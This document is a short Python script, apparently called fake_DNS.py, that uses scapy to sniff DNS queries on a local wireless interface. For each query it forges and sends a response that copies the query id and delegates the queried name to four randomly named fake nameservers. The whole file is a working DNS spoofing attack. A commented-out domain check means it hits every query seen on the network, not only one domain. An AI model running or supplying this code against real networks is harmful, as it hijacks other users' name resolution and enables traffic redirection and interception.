# cat -n fake_DNS.py 
#!/usr/bin/env python
from scapy.all import *
import random
import string
domain = 'bar.com'

def id_generator(size=6, chars=string.ascii_lowercase ):
    return ''.join(random.choice(chars) for _ in range(size))


def dns_spoof(pkt):
#    if domain in pkt[DNS].qd.qname:
    if pkt.dport == 53:
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                          DNS(id=pkt[DNS].id, qr=1, aa=0, qd=pkt[DNS].qd, qdcount=1, ancount=0, \
                            nscount=4, arcount=0,\
                          an=None, ns=(DNSRR(rrname=pkt[DNS].qd.qname, type='NS', \
                            ttl=3600, rdata='ns1.%s.com' % (id_generator()))/DNSRR(rrname=pkt[DNS].qd.qname, \
                            type='NS', ttl=3600, \
                            rdata='ns2.%s.com' % id_generator())/DNSRR(rrname=pkt[DNS].qd.qname, \
                            type='NS', ttl=3600, rdata='ns3.%s.com' % id_generator())/DNSRR(rrname=pkt[DNS].qd.qname, \
                            type='NS', ttl=3600, rdata='ns4.%s.com' % id_generator())))
            spoofed_pkt.show()
            send(spoofed_pkt)


sniff(filter='udp port 53', iface='wlo1', store=0, prn=dns_spoof)